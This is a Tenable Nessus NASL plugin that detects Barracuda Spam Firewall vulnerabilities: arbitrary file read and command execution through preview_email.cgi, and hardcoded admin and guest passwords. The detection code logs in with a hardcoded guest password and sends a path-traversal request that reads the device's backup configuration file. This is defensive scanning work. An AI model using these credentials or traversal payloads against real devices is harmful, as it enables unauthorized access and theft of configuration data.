#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(22130);
  script_version("$Revision: 1.14 $");

  script_cve_id("CVE-2006-4000", "CVE-2006-4001", "CVE-2006-4081", "CVE-2006-4082");
  script_bugtraq_id(19276);
  script_xref(name:"OSVDB", value:"27747");
  script_xref(name:"OSVDB", value:"27748");
  script_xref(name:"OSVDB", value:"27749");
  script_xref(name:"OSVDB", value:"29780");

  script_name(english:"Barracuda Spam Firewall Multiple Remote Vulnerabilities (Cmd Exec, Traversal, Default)");
  script_summary(english:"Tries to authenticate to Barracuda Networks Spam Firewall");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be a Barracuda Spam Firewall network
appliance, which protects mail servers from spam, viruses, and the
like. 

The firmware version of the Barracuda Spam Firewall on the remote
device fails to filter input to the 'file' parameter of the
'/cgi-bin/preview_email.cgi' script before using it to read files. 
Using specially crafted strings, an unauthenticated attacker can
leverage this flaw to read arbitrary files and even execute arbitrary
commands on the remote host.  While the web server executes as the
user 'nobody', it is possible to access several system commands
through the use of 'sudo' and thereby gain root privileges. 

In addition, the application contains hardcoded passwords for the
'admin' and 'guest' users." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2006-08/0025.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2006-08/0026.html" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2006-08/0110.html" );
 script_set_attribute(attribute:"solution", value:
"We are unaware of a public statement from the vendor regarding a fix,
but upgrading to firmware version 3.3.0.54 or later reportedly
addresses the issues." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# Extract some parameters from the login screen in preparation for logging in.
url = "/cgi-bin/index.cgi";
r = http_send_recv3(method: "GET", port:port, item: url);
if (isnull(r)) exit(0);
res = r[2];

params = NULL;
foreach var (make_list("enc_key", "et"))
{
  pat = string("name=", var, " value=([^>]+)>");
  matches = egrep(pattern:pat, string:res);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      val = eregmatch(pattern:pat, string:match);
      if (!isnull(val)) {
        params[var] = val[1];
        break;
      }
    }
  }
}


# If we got the necessary parameters.
if (!isnull(params) && params['enc_key'] && params['et'])
{
  # Try to log in.
  user = "guest";
  pass = "bnadmin99";
  postdata = string(
    "real_user=&",
    "login_state=out&",
    "locale=en_US&",
    "user=", user, "&",
    "password=", pass, "&",
    "password_entry=&",
    "enc_key=", params['enc_key'], "&",
    "et=", params['et'], "&",
    "Submit=Login"
  );
  r = http_send_recv3(method: "POST ", item: url, version: 11, port: port,
    add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"),
    data: postdata);
  if (isnull(r)) exit(0);

  # There's a problem if we can login.
  if ("title>Barracuda Spam Firewall: Current Operational Status" >< r[2])
  {
    contents = NULL;

    # If thorough tests are enabled...
    if (thorough_tests)
    {
      # Try to retrieve the backup copy of configuration file.
      r = http_send_recv3(method: "GET", port: port,
        item:string("/cgi-bin/preview_email.cgi?",
          "file=/mail/mlog/../tmp/backup/periodic_config.txt.tmp") );
      if (isnull(r)) exit(0);
      res = r[2];
      # If it looks successful...
      if ("account_bypass_quarantine" >< res)
      {
        contents = strstr(res, "<pre>");
        if (contents) contents = contents - "<pre>";
        if (contents) contents = contents - strstr(contents, "</pre>");
        if (contents) contents = str_replace(find:"<br> \", replace:"", string:contents);
      }
    }

    if (contents)
      report = string(
        "Here are the contents of a backup copy of the device's configuration\n",
        "file that Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
    else report = NULL;

    security_hole(port:port, extra:report);
    exit(0);
  }
}
